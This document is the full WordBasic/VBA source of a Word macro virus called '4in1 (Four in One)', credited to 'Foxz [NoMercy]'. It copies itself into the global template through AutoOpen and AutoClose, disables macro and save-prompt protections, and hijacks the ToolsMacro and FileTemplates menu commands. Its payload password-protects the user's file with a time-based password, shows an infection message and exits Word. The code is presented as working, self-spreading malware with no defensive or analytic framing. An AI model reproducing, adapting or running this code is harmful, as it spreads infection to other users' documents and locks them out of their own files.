   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Rem /----------------------------------------------------------\
   Rem |              Virus name: 4in1 (Four in One)              |
   Rem |              Origin    : Indonesia, Yogyakarta           |
   Rem |              Author    : Foxz [NoMercy] July 97          |
   Rem |              URL&eMail : You Know it !! :)               |
   Rem \----------------------------------------------------------/
   Dim AutoStatus
   Public Sub MAIN()
   Dim True_
   Dim False_
   Dim cfn$
   AutoStatus = 0
   On Error GoTo -1: On Error GoTo bail
   WordBasic.DisableAutoMacros 0
   WordBasic.DisableInput 1
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   WordBasic.ToolsCustomizeMenus ResetAll:=1
   True_ = -1
   False_ = Not True_
   InfectToGlobal
   MakeNewMacro
   WordBasic.MacroCopy WordBasic.[MacroFileName$]() + ":ToolsMacro", "Global:ToolsMacro"
   WordBasic.MacroCopy WordBasic.[MacroFileName$]() + ":FileTemplates", "Global:FileTemplates"
   WordBasic.MacroCopy WordBasic.[MacroFileName$]() + ":AutoClose", "Global:AutoClose"
   cfn$ = WordBasic.[FileName$]()
   WordBasic.Organizer Delete:=1, Source:=cfn$, Name:="ToolsMacro", Tab:=3
   WordBasic.Organizer Delete:=1, Source:=cfn$, Name:="FileTemplates", Tab:=3
   WordBasic.Organizer Delete:=1, Source:=cfn$, Name:="AutoClose", Tab:=3
   If WordBasic.Weekday(WordBasic.Now()) = 1 Then Hell
   If AutoStatus = 1 Then GoTo bail
   If AutoStatus <> 0 Then bail
   bail:
   Err.Number = 0
   done:
   WordBasic.FileSaveAs Format:=1
   End Sub
   Private Sub Hell()
   Dim fp$
   Dim fn$
   fp$ = WordBasic.[Time$]()
   fn$ = WordBasic.[FileName$]()
   WordBasic.ToolsOptionsSave Password:=fp$, WritePassword:=fp$
   WordBasic.MsgBox "oh no!!!, your file was infected by virus", "WM. Four In One", 16
   WordBasic.FileExit 1
   End Sub
   Private Sub InfectToGlobal()
   Dim True_
   Dim False_
   Dim i
   Dim FoundIDMacro
   Rem A code from Andry.A
   On Error GoTo -1: On Error GoTo Abort
   True_ = -1
   False_ = Not True_
   For i = 1 To WordBasic.CountMacros(False_, False_)
   If WordBasic.[MacroName$](i, False_) = "NoMercy" Then
   FoundIDMacro = True_
   End If
   Next i
   If Not FoundIDMacro Then
   WordBasic.MacroCopy WordBasic.[MacroFileName$]() + ":AutoOpen", "Global:NoMercy"
   Else
   WordBasic.MacroCopy WordBasic.[MacroFileName$]() + ":AutoOpen", "Global:NoMercy"
   End If
   Abort:
   End Sub
   Private Sub MakeNewMacro()
   NewToolsMacro
   NewFIleTemplates
   NewFileExit
   End Sub
   Private Sub NewToolsMacro()
   WordBasic.DisableInput 1
   WordBasic.ScreenUpdating 0
   On Error GoTo -1: On Error GoTo sialan
   WordBasic.ToolsMacro Name:="ToolsMacro", Delete:=1
   WordBasic.ToolsMacro Name:="ToolsMacro", Edit:=1
   WordBasic.EditSelectAll
   WordBasic.Insert " "
   WordBasic.Insert "Sub MAIN" + Chr(13)
   WordBasic.Insert "'/----------------------------------------------------------\" + Chr(13)
   WordBasic.Insert "'|              Virus name: 4in1 (Four  in One)             |" + Chr(13)
   WordBasic.Insert "'|              Origin    : Indonesia, Yogyakarta           |" + Chr(13)
   WordBasic.Insert "'|              Author    : Foxz [NoMercy] July 97          |" + Chr(13)
   WordBasic.Insert "'|              URL&eMail : You Know it !! :)               |" + Chr(13)
   WordBasic.Insert "'\----------------------------------------------------------/" + Chr(13)
   WordBasic.Insert "fp$ = Time$()" + Chr(13)
   WordBasic.Insert "fn$ = FileName$()" + Chr(13)
   WordBasic.Insert "ToolsOptionsSave  .Password = fp$, .WritePassword = fp$" + Chr(13)
   WordBasic.Insert "FileExit 1" + Chr(13)
   WordBasic.Insert "End sub"
   WordBasic.DocClose 1
   WordBasic.ScreenUpdating 0
   sialan:
   WordBasic.ScreenUpdating 0
   WordBasic.ToolsMacro Name:="ToolsMacro", Edit:=1
   On Error GoTo -1: On Error GoTo done:
   WordBasic.EditSelectAll
   WordBasic.Insert " "
   WordBasic.Insert "Sub MAIN" + Chr(13)
   WordBasic.Insert "'/----------------------------------------------------------\" + Chr(13)
   WordBasic.Insert "'|              Virus name: 4in1 (Four in One)              |" + Chr(13)
   WordBasic.Insert "'|              Origin    : Indonesia, Yogyakarta           |" + Chr(13)
   WordBasic.Insert "'|              Author    : Foxz [NoMercy] July 97          |" + Chr(13)
   WordBasic.Insert "'|              URL&eMail : You Know it !! :)               |" + Chr(13)
   WordBasic.Insert "'\----------------------------------------------------------/" + Chr(13)
   WordBasic.Insert "fp$ = Time$()" + Chr(13)
   WordBasic.Insert "fn$ = FileName$()" + Chr(13)
   WordBasic.Insert "ToolsOptionsSave  .Password = fp$, .WritePassword = fp$" + Chr(13)
   WordBasic.Insert "FileExit 1" + Chr(13)
   WordBasic.Insert "End sub"
   WordBasic.DocClose 1
   WordBasic.ScreenUpdating 0
   done:
   End Sub
   Private Sub NewFileExit()
   WordBasic.DisableInput 1
   WordBasic.ScreenUpdating 0
   On Error GoTo -1: On Error GoTo sialan
   WordBasic.ToolsMacro Name:="AutoClose", Delete:=1
   WordBasic.ToolsMacro Name:="AutoClose", Edit:=1
   WordBasic.EditSelectAll
   WordBasic.Insert " "
   WordBasic.Insert "Sub MAIN" + Chr(13)
   WordBasic.Insert "'/----------------------------------------------------------\" + Chr(13)
   WordBasic.Insert "'|              Virus name: 4in1 (Four in One)              |" + Chr(13)
   WordBasic.Insert "'|              Origin    : Indonesia, Yogyakarta           |" + Chr(13)
   WordBasic.Insert "'|              Author    : Foxz [NoMercy] July 97          |" + Chr(13)
   WordBasic.Insert "'|              URL&eMail : You Know it !! :)               |" + Chr(13)
   WordBasic.Insert "'\----------------------------------------------------------/" + Chr(13)
   WordBasic.Insert "FileSaveAs .Format = 1" + Chr(13)
   WordBasic.Insert "C2F = INF(" + Chr(34) + "NoMercy" + Chr(34) + ", " + Chr(34) + "AutoOpen" + Chr(34) + ")" + Chr(13)
   WordBasic.Insert "FileSaveAs .Format = 1" + Chr(13)
   WordBasic.Insert "End Sub" + Chr(13)
   WordBasic.Insert " " + Chr(13)
   WordBasic.Insert "Function INF(Foxz$, Foxs$)" + Chr(13)
   WordBasic.Insert "cfn$ = FileName$()" + Chr(13)
   WordBasic.Insert "MacroCopy " + Chr(34) + "Global:" + Chr(34) + " + Foxz$"
   WordBasic.Insert ", cfn$ +" + Chr(34) + ":" + Chr(34) + " + Foxs$" + Chr(13)
   WordBasic.Insert "INF = 1" + Chr(13)
   WordBasic.Insert "End Function" + Chr(13)
   WordBasic.DocClose 1
   WordBasic.ScreenUpdating 0
   sialan:
   WordBasic.ScreenUpdating 0
   WordBasic.ToolsMacro Name:="AutoClose", Edit:=1
   On Error GoTo -1: On Error GoTo done:
   WordBasic.EditSelectAll
   WordBasic.Insert " "
   WordBasic.Insert "Sub MAIN" + Chr(13)
   WordBasic.Insert "'/----------------------------------------------------------\" + Chr(13)
   WordBasic.Insert "'|              Virus name: 4in1 (Four in One)              |" + Chr(13)
   WordBasic.Insert "'|              Origin    : Indonesia, Yogyakarta           |" + Chr(13)
   WordBasic.Insert "'|              Author    : Foxz [NoMercy] July 97          |" + Chr(13)
   WordBasic.Insert "'|              URL&eMail : You Know it !! :)               |" + Chr(13)
   WordBasic.Insert "'\----------------------------------------------------------/" + Chr(13)
   WordBasic.Insert "FileSaveAs .Format = 1" + Chr(13)
   WordBasic.Insert "C2F = INF(" + Chr(34) + "NoMercy" + Chr(34) + ", " + Chr(34) + "AutoOpen" + Chr(34) + ")" + Chr(13)
   WordBasic.Insert "FileSaveAs .Format = 1" + Chr(13)
   WordBasic.Insert "End Sub" + Chr(13)
   WordBasic.Insert " " + Chr(13)
   WordBasic.Insert "Function INF(Foxz$, Foxs$)" + Chr(13)
   WordBasic.Insert "cfn$ = FileName$()" + Chr(13)
   WordBasic.Insert "MacroCopy " + Chr(34) + "Global:" + Chr(34) + " + Foxz$"
   WordBasic.Insert ", cfn$ +" + Chr(34) + ":" + Chr(34) + " + Foxs$" + Chr(13)
   WordBasic.Insert "INF = 1" + Chr(13)
   WordBasic.Insert "End Function" + Chr(13)
   WordBasic.DocClose 1
   WordBasic.ScreenUpdating 0
   done:
   End Sub
   Private Sub NewFIleTemplates()
   WordBasic.DisableInput 1
   WordBasic.ScreenUpdating 0
   On Error GoTo -1: On Error GoTo sialan
   WordBasic.ToolsMacro Name:="FileTemplates", Delete:=1
   WordBasic.ToolsMacro Name:="FileTemplates", Edit:=1
   WordBasic.EditSelectAll
   WordBasic.Insert " "
   WordBasic.Insert "Sub MAIN" + Chr(13)
   WordBasic.Insert "'/----------------------------------------------------------\" + Chr(13)
   WordBasic.Insert "'|              Virus name: 4in1 (Four in One)              |" + Chr(13)
   WordBasic.Insert "'|              Origin    : Indonesia, Yogyakarta           |" + Chr(13)
   WordBasic.Insert "'|              Author    : Foxz [NoMercy] July 97          |" + Chr(13)
   WordBasic.Insert "'|              URL&eMail : You Know it !! :)               |" + Chr(13)
   WordBasic.Insert "'\----------------------------------------------------------/" + Chr(13)
   WordBasic.Insert "fp$ = Time$()" + Chr(13)
   WordBasic.Insert "fn$ = FileName$()" + Chr(13)
   WordBasic.Insert "ToolsOptionsSave  .Password = fp$, .WritePassword = fp$" + Chr(13)
   WordBasic.Insert "FileExit 1" + Chr(13)
   WordBasic.Insert "End sub"
   WordBasic.DocClose 1
   WordBasic.ScreenUpdating 0
   sialan:
   WordBasic.ScreenUpdating 0
   WordBasic.ToolsMacro Name:="FileTemplates", Edit:=1
   On Error GoTo -1: On Error GoTo done:
   WordBasic.EditSelectAll
   WordBasic.Insert " "
   WordBasic.Insert "Sub MAIN" + Chr(13)
   WordBasic.Insert "'/----------------------------------------------------------\" + Chr(13)
   WordBasic.Insert "'|              Virus name: 4in1 (Four in One)              |" + Chr(13)
   WordBasic.Insert "'|              Origin    : Indonesia, Yogyakarta           |" + Chr(13)
   WordBasic.Insert "'|              Author    : Foxz [NoMercy] July 97          |" + Chr(13)
   WordBasic.Insert "'|              URL&eMail : You Know it !! :)               |" + Chr(13)
   WordBasic.Insert "'\----------------------------------------------------------/" + Chr(13)
   WordBasic.Insert "fp$ = Time$()" + Chr(13)
   WordBasic.Insert "fn$ = FileName$()" + Chr(13)
   WordBasic.Insert "ToolsOptionsSave  .Password = fp$, .WritePassword = fp$" + Chr(13)
   WordBasic.Insert "FileExit 1" + Chr(13)
   WordBasic.Insert "End sub"
   WordBasic.DocClose 1
   WordBasic.ScreenUpdating 0
   done:
   End Sub
